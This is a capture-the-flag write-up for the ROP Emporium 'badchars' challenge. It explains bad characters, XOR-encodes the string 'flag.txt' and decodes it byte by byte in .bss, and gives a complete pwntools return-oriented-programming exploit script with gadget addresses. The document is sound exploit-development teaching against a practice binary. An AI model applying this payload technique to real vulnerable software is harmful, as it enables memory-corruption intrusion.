# ROP Emporium | badchars

## What are Bad Characters?

If, let's say, in a binary `'a'` is a bad character (hex `0x61`), then wherever it appears — in registers or addresses — it will be truncated, ignored, or mutated. Hence, no part of our exploit or the addresses we use should contain that bad character.

For example:

- You **can't store** `'flag.txt'` in a register because `'a'` will not be accepted.
- You **can't use** an address like `0x03486103`, because it contains `0x61`.
- However, you **can use** an address like `0x06130210`, because it's not `0x61`— it's `0x06` and `0x13`.

---

## Output of `./badchars`

```
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> heyyo
Thank you!
```

To save us from doing too much reverse engineering to find the bad characters, the challenge gives them to us:

```
'x' 'a' 'g' '.'
Hex: 78 61 67 2e
```

---

## Objective

Just like the previous challenge `write4`, we are provided a `print_file()` function, and we need to place `'flag.txt'` into the `rdi` register and then call `print_file()` from the PLT.

We can write in the `.bss` or `.data` section. We'll be choosing `.bss` (reason explained at the end).

### Useful Gadgets (Found using ROPgadget)

```python
g1 = p64(0x004006a3) # pop rdi; ret;
g2 = p64(0x00400634) # mov qword ptr [r13], r12; ret;
g3 = p64(0x0040069c) # pop r12; pop r13; pop r14; pop r15; ret;
```

We only need `r12` and `r13` to write to memory, so we can zero out `r14` and `r15` using `p64(0x00)`.

Let’s also grab the `.bss` and `print_file()` addresses:

```python
bss_addr = 0x00601038
print_file = p64(0x00400510)
```

---

## Sending the String

Since we can't directly send `'flag.txt'` because `'a'`, `'g'`, `'x'`, and `'.'` are badchars, we need to encode them using XOR.

The cool property of XOR:

```
if str1 ^ key = str2, then str2 ^ key = str1
```

We’ll use this trick to encode `'flag.txt'` and decode it in place during runtime.

### Encoding

Let’s choose a key: `0x0202020202020202`. Using an XOR calculator, this encodes `'flag.txt'` to:

```
dnce,vzv
```

This new string contains **no badchars**. We pad and pack it:

```python
str = b"dnce,vzv".ljust(8, b'\x00')
str_packed = p64(u64(str))
xor_key = p64(0x0202020202020202)
```

Now use the pop and mov gadgets to write it into `.bss`.

---

## Decoding

From the disassembly, a useful gadget is:

```python
g4 = p64(0x00400628) # xor byte [r15], r14b
g5 = p64(0x004006a0) # pop r14 ; pop r15 ; ret
```

Here, `r14b` refers to the lowest byte of the `r14` register. In `.bss`, one address corresponds to one byte, so we can decode the string byte-by-byte.

### Memory Layout Example

A string like `0x0123456789abcdef` is stored as:

```
0x40231 : 0x01
0x40232 : 0x23
...
0x40238 : 0xef
```

So to decode, we need to:

- Set `r14b` to the XOR key byte (0x02 in our case)
- Set `r15` to the byte’s address
- Run the `xor` gadget

### Loop Explanation

We XOR each byte of the encoded string in memory with the appropriate byte of the key. Since the key was packed in little-endian format, the bytes are stored in reverse order. So we iterate from the last byte to the first:

```python
for i in range(8):
    payload += g5
    payload += p64(xor_key[7 - i])  # Because little-endian stores bytes in reverse
    payload += p64(bss_addr + i)    # Address of each byte to decode
    payload += g4                   # xor byte [r15], r14b
```

This decodes each byte in memory back into `'flag.txt'`.

---

## Final Payload

```python
from pwn import *

p = process('./badchars')

junk = b'A'*40
str = b"dnce,vzv".ljust(8, b'\x00')
str_packed = p64(u64(str))
xor_key = p64(0x0202020202020202)

bss_addr = 0x00601038
print_file = p64(0x00400510)

# gadgets
g1 = p64(0x004006a3) # pop rdi; ret;
g2 = p64(0x00400634) # mov qword ptr [r13], r12; ret;
g3 = p64(0x0040069c) # pop r12; pop r13; pop r14; pop r15; ret;
g4 = p64(0x00400628) # xor byte [r15], r14b
g5 = p64(0x004006a0) # pop r14 ; pop r15 ; ret

payload = junk
payload += g3 + str_packed + p64(bss_addr) + p64(0x00) + p64(0x00) + g2

for i in range(8):
    payload += g5
    payload += p64(xor_key[7-i])
    payload += p64(bss_addr + i)
    payload += g4

payload += g1 + p64(bss_addr) + print_file

p.sendline(payload)
p.interactive()
```

This returns the flag.

---

## Important Note: Why Use `.bss` Instead of `.data`?

If we use the `.data` section (`0x601028`), we run into a subtle bug during decoding.

```
[+] XOR-ing byte at 0x601028 : d with 0x2
[+] XOR-ing byte at 0x601029 : n with 0x2
[+] XOR-ing byte at 0x60102a : c with 0x2
[+] XOR-ing byte at 0x60102b : e with 0x2
[+] XOR-ing byte at 0x60102c : , with 0x2
[+] XOR-ing byte at 0x60102d : v with 0x2
[+] XOR-ing byte at 0x60102e : z with 0x2
[+] XOR-ing byte at 0x60102f : v with 0x2

```

You know what this returns? `flag.tzt`.
Why? 

Take a look at the address where 'z' is stored: `0x60102e`. 

It contains `2e`!!!! 

Which is a **badchar** and is hence **ignored**. The addresses following `.bss` don't have any badchars, therefore it is safe to use.

This took me around an hour to figure out after debugging a lot. So, be very wary of badchars, especially in addresses.


